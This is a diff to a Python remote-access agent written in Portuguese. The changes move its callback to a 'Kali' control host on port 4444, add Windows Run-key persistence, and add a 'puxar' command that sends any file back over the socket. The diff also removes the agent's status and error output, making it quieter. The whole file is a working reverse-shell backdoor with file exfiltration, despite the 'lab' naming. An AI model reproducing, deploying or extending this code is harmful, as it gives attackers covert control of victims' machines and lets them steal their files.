@@ -3,7 +3,6 @@ import os
 import sys
 import time
 
-# O módulo winreg é nativo do Python no Windows.
 try:
     import winreg as reg
 except ImportError:
@@ -11,98 +10,106 @@ except ImportError:
 
 class Intranet:
     def __init__(self):
-        self.ip = "192.168.0.118"
-        self.porta = 80
+        self.ip = "192.168.0.118"  # IP do seu Kali/PC de controle
+        self.porta = 4444          
         self.intervalo_reconexao = 5
         self.nome_persistenca = "AgenteMonitoramentoLab"
 
     def garantir_persistencia(self):
-        """
-        Fase 1: Tenta registrar o caminho do script na chave 'Run' do Windows
-        para garantir a inicialização automática com o sistema.
-        """
         if reg is None:
-            print("[-] Sistema operacional não suporta winreg (Não é Windows). Pulando persistência.")
             return
-
         try:
             caminho_atual = os.path.abspath(sys.argv[0])
             subchave_run = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
             chave_aberta = reg.OpenKey(reg.HKEY_CURRENT_USER, subchave_run, 0, reg.KEY_WRITE)
             reg.SetValueEx(chave_aberta, self.nome_persistenca, 0, reg.REG_SZ, caminho_atual)
             reg.CloseKey(chave_aberta)
-            print("[+] Configuração de persistência simulada com sucesso.")
-            
-        except Exception as erro:
-            print(f"[-] Erro ao tentar interagir com o Registro: {erro}")
+        except:
+            pass
 
-    def executar_comando(self, comando_str):
-        """
-        Executa o comando recebido. Trata o 'cd' internamente para 
-        permitir a navegação persistente entre pastas.
-        """
+    def transferir_arquivo(self, nome_arquivo, sock):
+        """Lê qualquer arquivo (foto, vídeo, pdf) em modo binário e envia."""
+        if not os.path.exists(nome_arquivo):
+            sock.sendall(f"[-] Erro: O arquivo '{nome_arquivo}' nao foi encontrado.\n".encode("utf-8"))
+            return
+
         try:
-            # CORREÇÃO: Tratamento do comando de navegação 'cd'
+            tamanho = os.path.getsize(nome_arquivo)
+            sock.sendall(f"[+] Iniciando transferencia de {nome_arquivo} ({tamanho} bytes)...\n".encode("utf-8"))
+            time.sleep(0.5) 
+
+            with open(nome_arquivo, "rb") as f:
+                while True:
+                    bytes_lidos = f.read(1024)
+                    if not bytes_lidos:
+                        break 
+                    sock.sendall(bytes_lidos)
+            
+            sock.sendall(b"\n[+] Transferencia concluida com sucesso.\n")
+        except Exception as erro:
+            sock.sendall(f"[-] Erro ao transferir arquivo: {erro}\n".encode("utf-8"))
+
+    def executar_comando(self, comando_str, sock):
+        try:
+            if comando_str.lower().startswith("puxar "):
+                nome_arquivo = comando_str[6:].strip()
+                self.transferir_arquivo(nome_arquivo, sock)
+                return None 
+
             if comando_str.lower().startswith("cd "):
                 nova_pasta = comando_str[3:].strip()
-                os.chdir(nova_pasta)  # Altera o diretório do processo principal
-                caminho_atual = os.getcwd()
-                return f"[+] Diretório alterado para: {caminho_atual}\n".encode("utf-8")
+                os.chdir(nova_pasta)  
+                return None # O prompt atualizado já vai mostrar a pasta nova
             
-            # Execução de comandos gerais
             resultado = os.popen(comando_str).read()
             if not resultado:
                 return b"\n"
             return resultado.encode("utf-8")
-            
         except Exception as erro:
             return f"[-] Erro ao executar comando: {erro}\n".encode("utf-8")
 
     def iniciar_conexao(self):
-        """
-        Fase 2 e 3: Gerenciamento de rede (TCP) com tolerância a falhas.
-        """
         while True:
             sock = None
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                print(f"[+] Tentando conectar a {self.ip}:{self.porta}...")
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 
+                print(f"[+] Tentando conectar a {self.ip}:{self.porta}...")
                 sock.connect((self.ip, self.porta))
-                print("[+] Conexão estabelecida com a máquina de controle.")
+                
+                sock.sendall(b"[+] Conexao interativa estabelecida com o Agente POO!\n")
                 
                 while True:
-                    dados_recebidos = sock.recv(1024)
+                    # A MÁGICA DO PROMPT ESTÁ AQUI:
+                    # Captura a pasta atual e envia como um indicador de linha de comando (ex: /home/user> )
+                    pasta_atual = os.getcwd()
+                    prompt_formatado = f"\n{pasta_atual}> "
+                    sock.sendall(prompt_formatado.encode("utf-8"))
                     
+                    dados_recebidos = sock.recv(1024)
                     if not dados_recebidos:
-                        print("[-] Conexão encerrada pelo servidor remoto.")
                         break
                     
                     comando_str = dados_recebidos.decode("utf-8").strip()
-                    print(f"[*] Comando recebido: {comando_str}")
-                    
+                    if not comando_str:
+                        continue
+                        
                     if comando_str.lower() == "exit":
-                        print("[*] Comando de saída recebido.")
                         break
                     
-                    resposta_bytes = self.executar_comando(comando_str)
-                    sock.sendall(resposta_bytes)
+                    resposta_bytes = self.executar_comando(comando_str, sock)
+                    if resposta_bytes:
+                        sock.sendall(resposta_bytes)
                         
-            except (socket.error, Exception) as erro_rede:
-                print(f"[-] Falha na comunicação: {erro_rede}")
-                print(f"[*] Reiniciando ciclo de busca em {self.intervalo_reconexao} segundos...")
+            except (socket.error, Exception):
                 time.sleep(self.intervalo_reconexao)
-                
             finally:
                 if sock:
-                    try:
-                        sock.close()
-                    except:
-                        pass
+                    try: sock.close()
+                    except: pass
 
     def rodar(self):
-        print("[*] Iniciando análise do ciclo de vida do agente local (POO)...")
         self.garantir_persistencia()
         self.iniciar_conexao()
 
